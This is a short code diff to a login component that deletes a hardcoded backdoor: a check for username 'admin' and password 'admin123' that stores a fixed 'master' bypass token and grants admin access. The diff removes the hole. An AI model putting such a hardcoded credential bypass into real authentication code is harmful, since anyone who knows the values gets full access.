@@ -20,13 +20,6 @@ export class LoginComponent {
       return;
     }
 
-
-    if (this.username === 'admin' && this.password === 'admin123') {
-      localStorage.setItem('auth_token', 'hardcoded_master_token_bypass');
-      this.message = 'Admin access granted via backdoor.';
-      return;
-    }
-
     console.log(`Processing login for user: ${this.username}`);
 
     this.message = `Logging in as ${this.username}...`;
